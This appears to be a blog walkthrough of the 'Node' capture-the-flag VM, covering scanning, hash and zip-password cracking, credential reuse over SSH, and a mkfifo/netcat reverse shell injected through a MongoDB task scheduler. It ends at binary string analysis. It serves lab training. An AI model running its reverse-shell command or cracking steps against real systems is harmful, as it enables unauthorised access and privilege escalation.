title: Node CTF Walkthrough
date: 2018-10-31
excerpt: "Write-up of Node 1 CTF"
tags: [ctf, cybersec, node.js, node, nmap]
---

Node is a CTF made by Rob Carr (rastating). Instead of relying on publicly available exploits, it features multiple security misconfigurations, a custom binary, and quite a few false leads along the way. It's marked as intermediate, and I feel that's accurate.

Kioptrix, while older, served as a good introduction to Find->Scan->Exploit. Node takes this further, in that you have use everything you can find to make smaller, more incremental steps.

## VM Setup
I'll be attacking this with Kali in VirtualBox.  Kali and Node are both on a NAT Network, with an IP range of 10.0.2.0/24.

## Discovery
I prefer Nmap's Ping Scan rather than netdiscover, but both work fine.

```bash
root@kali:~# nmap -sP 10.0.2.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-01 10:32 EDT
...
MAC Address: 08:00:27:4C:20:D2 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.7
Host is up (0.00021s latency).
...
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.10 seconds
```

Target is 10.0.2.7.

## Port Scan
Back at it again with Nmap with these arguments:
* -p- All ports (1-65535)
* -sV Service Scan, taking guesses at what services are running on the target.
* -T4 Quick timing, but not overly aggressive.
* -sS Stealth SYN scan.
* -O  OS Detection.

```bash
root@kali:~# nmap -p- -sV -T4 -sS -O 10.0.2.7
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-01 10:38 EDT

## Website Enumeration
Since we only have port 22 (SSH) and Node.js on port 3000, let's see what Node is running.

OOh, a myspace knockoff. I like it.

### Dirb & Nikto
As per usual with websites, we'll try a directory bruteforce attack to see if there's anything hidden.

```bash
root@kali:~# dirb http://10.0.2.7:3000

-----------------
DIRB v2.22

So, something is preventing dirb from working. Even with the -f flag, it fails to find anything. We'll try with Nikto and see if that fairs any better.

```bash

```

Nikto called it quits due to failures, likely with what's messing with Dirb. However, we were still able to enumerate some directories. Upon trying to go to any of those directories, it redirects to the home page. Oh well, let's see what's in the page source.

### Source Code
Most of the page source consists of the frontend; however, there are lots of Javascript files linked at the bottom:

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/js_files.PNG" alt="">
  <figcaption>Linked Javascript files</figcaption>
</figure>

We can likely ignore jquery, bootstrap, freelancer, and angular, given they are minimized files and three are from the vendor. (Though, I suppose a cunning individual could replace them with custom code.)

For now, let's look at each file under assets/js/app:

#### App.js

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/app_js.PNG" alt="">
</figure>

This is the routing logic. It runs the specified controller and specifies which template/view should be used.
I'm sure I've gotten the wording there wrong for a number of reasons, but that's my understanding after having used Laravel for a multitude of projects.

#### home.js

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/home_js.PNG" alt="">
</figure>

This controller pulls user info via a GET request to '/api/users/latest' and passes it back to app.js to process the home view with the data from that GET request. We'll check out what exactly that API returns shortly.

#### login.js

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/login_js.PNG" alt="">
</figure>

We can attempt to authenticate via a POST request to '/api/sessions/authenticate'. If successful, it will redirect us to /admin. Other than that, this doesn't do much.

#### admin.js

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/admin_js.PNG" alt="">
</figure>

The admin controller hints at a "backup" function via an API call. We have to have a valid session to access it, though.

#### profile.js

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/profile_js.PNG" alt="">
</figure>

This is the profile handler. It uses a GET request to fetch the user info for a specified username, and does the usual template/view process. This is accomplished by requesting 'api/users' + $username.

Let's call the API and see what it answers with.

## API Calls
The two API calls we can make are 'api/users/latest' and 'api/users'. (And '/api/sessions/authenticate', but we have no credentials to go off now.) We'll use Burp to make the requests.

### Burp
If you're not familiar with Burp, it's a wonderful tool for dealing with requests. Since I can't recall how to make a request from scratch, I'll set up Burp as a proxy for Firefox which can then catch a request.

Requesting the home page in Firefox, burp will catch the request and ask to forward or drop it.

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/burp_catch.PNG" alt="">
  <figcaption>Burp catching a request.</figcaption>
</figure>

What we'll do from here is right-click and "Send to Repeater". The repeater makes for an easy way to modify the request and do manual ones.

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/burp_repeat.PNG" alt="">
  <figcaption>Burp's repeater.</figcaption>
</figure>

To make the requests we want, we'll remove the referrer and the If-None-Match fields. When we click "Go", Burp will send the request. Because the home page uses 'api/users/latest', it's pre-populated in the request.

Sending the request gets us some interesting feedback:

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/burp_ids.PNG" alt="">
  <figcaption>The Response from /api/users/latest</figcaption>
</figure>

What we have are the IDs, usernames, passwords (likely hashed), and a boolean dictating whether the user is an admin.

While this is a great find, let's try out '/api/users'. Simply edit the request in Burp's repeater and hit "Go" again.

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/burp_all.PNG" alt="">
  <figcaption>The Response from /api/users/</figcaption>
</figure>

This seems to have returned ALL users for the site, including one with is_admin marked True. For authenitcation, we'll worry about the usernames and passwords. So let's take the response we got from Burp, clean it up, and see if we can make any sense of these password hashes.

## User Hashes
Before we have John attempt to crack the hashes, we'll want to know what type they are. [HashID](https://github.com/psypanda/hashID) is a tool included with Kali for just this purpose.

### HashID
We'll pass one of the password hashes into HashID and see what it thinks.

```bash
root@kali:~# hashid dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
Analyzing 'dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af'

[+] SHA-256
[+] RIPEMD-256

[+] GOST CryptoPro S-Box
[+] SHA3-256
[+] Skein-256
[+] Skein-512(256)
```

Of these, SHA-256 and SHA3-256 are the most likely. We'll try in that order with John.

### John
To get John working properly, we'll create a text file with the usernames and hashes organized like so: user:hash, each account separated by newlines.

We'll invoke John, telling it the format is Raw SHA256, and we'll try the usual rockyou.txt as the wordlist.

```bash
root@kali:~/Desktop/Node# john --format=raw-sha256 -w /usr/share/wordlists/rockyou.txt users.txt
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt

Session completed
```

Nice! We got 3 out of 4 passwords, including account with admin privileges. Let's log in with it.

### Logging In
When we log in to Myplace using myP14ceAdm1nAcc0uNT:manchester, we see a "Welcome Back" message and a "Download Backup" button.

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/myplace_backup.PNG" alt="">
  <figcaption>The Admin Page</figcaption>
</figure>

Let's download the backup and see what we got.

## Backup?
Upon downloading, Firefox thinks it's a 3.3MB text file. The filename is 'myplace.backup'. If you open it in Gedit, Gedit will crash.

### Examination
If we run the 'file' command on it, it appears to be a text file. Tail, on the other hand, shows a lot of data encoded in base64. (You can usually tell by the equal signs on the end, hence why I used tail instead of head.)

```bash
root@kali:~/Desktop/Node# file myplace.backup
myplace.backup: ASCII text, with very long lines, with no line terminators
root@kali:~/Desktop/Node# tail myplace.backup -c 100
tvUlAHZhci93d3cvbXlwbGFjZS9hcHAuaHRtbFVUBQADvpWqWXV4CwABBAAAAAAEAAAAAFBLBQYAAAAAXwNfA3edAQDQ+iUAAAA=
```

I decoded 'myplace.backup' into 'thing', and reran the file command on it.

```bash
root@kali:~/Desktop/Node# base64 --decode myplace.backup > thing
root@kali:~/Desktop/Node# ls
myplace.backup  thing  users.txt
root@kali:~/Desktop/Node# file thing
thing: Zip archive data, at least v1.0 to extract
```

So, it's a zip file. A simple unzip ought to take care of that.

```bash
root@kali:~/Desktop/Node# unzip thing
Archive:  thing
   creating: var/www/myplace/
[thing] var/www/myplace/package-lock.json password:
```

Or not. Time to bring out another tool.

### Zip Cracking
I originally attempted this task using zip2john and John, but the version bundled with Kali doesn't include support for pkzip, which is what zip2john reports as the password hash.

I tried to download the Jumbo/Community version of John, and while I got to compile, it also had trouble with pkzip. So, I looked elsewhere and found [zipCracker](https://github.com/aneopsy/zipCracker). It's simple, but it worked for me here.

I chose to clone the repo, but you can download just zipcracker.py directly.

```bash
root@kali:~/Desktop/Node# python zipcracker.py -f thing -w /usr/share/wordlists/rockyou.txt
  182878 / 14344392 |   1.00% -> magiqueuroanhesto9p0ankolptes and more!

Password cracked: magicword

Took 99.660577 seconds to crack the password. That is, 1835 attempts per second.
```

Now we can unzip the decoded backup archive. This results in what seems to be an archive of /var/www/myplace on the target.

### Enumerating (app.js)
Going through the unpacked archive, the top-level files are app.html and app.js. If you look further in, you'll find static assets like the JS controllers we've already seen, profile pictures, and node_modules and vendor directories.  We've sort of seen app.html already, so let's check out app.js.

There's several items of interest here.

#### Constants

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/appjs_constants.PNG" alt="">
</figure>

First off, it's using MongoDB and the login information is there. (Mark, with password 5AYRft73VtFpc84k)

Second, this requires permission to spawn a child process, and there's a hardcoded 'backup_key'.

#### User-Agent Blacklist

<figure>
    <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/appjs_useragent.PNG" alt="">
</figure>

Here's the code that prevents Dirb from working, as well as Postman, older Windows?, and Go. This serves a random string of letters along with a trollface.

#### API Routes
Looking through the code, you'll see what powers the 'api/users/latest', 'api/users', 'api/session/authenticate' and others. Other than confirming our results from other (returning user data, password hashes are raw SHA-256), there's not much to see.

#### '/api/admin/backup'
Other than the MongoDB credentials, this is the good stuff. The child process spawned is '/usr/local/bin/backup' with the arguments -q, the backup key, and __dirname (Node-speak for webroot).  Even without looking at the code for the backup binary, we know it does something with the backup key, takes the webroot folder, zips it, and encodes it in Base64.

## SSH as Mark
Let's put the credentials we found earlier to use. The only available port is SSH.

<figure>
    <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/mark_ssh.PNG" alt="">
</figure>

And we're in with a massive Ubuntu banner.

### System Enumeration
While there's nothing in Mark's home folder, there are a couple other users on the system: frank and tom. Frank also doesn't have anything for us, but Tom has a 'user.txt' that we can't read.

<figure>
    <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/mark_home.PNG" alt="">
</figure>

Running 'ps aux' to show processes reveals another Node.js app, known as scheduler, running as Tom.

### Scheduler
Going to /var/scheduler to investigate reveals only another app.js.

It requires child process execution and uses the same login info for MongoDB as myplace, only the authSource is different.

<figure>
    <img src="{{ site.url }}{{ site.baseurl }}/assets/img/node/scheduler.PNG" alt="">
</figure>

The meat and potatoes: it grabs each record in the 'tasks' collection/table, executes it, then deletes it. This happens every 30 seconds. So, we can effectively run a command as tom via this scheduler by adding a command to the tasks collection via Mark's credentials.

## Switching to Tom
Courtesy of PentestMonkey, I tried a few simple reverse shells and got the mkfifo netcat one to work.

We set up a listener on Kali using netcat, then add the command to MongoDB like so:

```bash
mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> db.tasks.insert({cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 4444 >/tmp/f"});
WriteResult({ "nInserted" : 1 })
```

From our reverse shell as Tom, we can go ahead and grab the user.txt flag.

```bash
root@kali:~# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.7] 37520
/bin/sh: 0: can't access tty; job control turned off
$ whoami
tom
$ which python
/usr/bin/python
$ python -c 'import pty; pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@node:/$ whoami
whoami
tom
tom@node:~$ cat /home/tom/user.txt
cat /home/tom/user.txt
e1156acc3574e04b06908ecf76be91b1
```

From here, let's check out that backup binary in /usr/local/bin/

## Secure Backup 1.0
Running it directly doesn't seem to do anything...

Let's run it through strings and see if we can shed some light on the internals.
### Analysis
Strings gives us quite a bit of info. I'll step through it part by part.

```bash
tom@node:~$ strings /usr/local/bin/backup
strings /usr/local/bin/backup
/lib/ld-linux.so.2
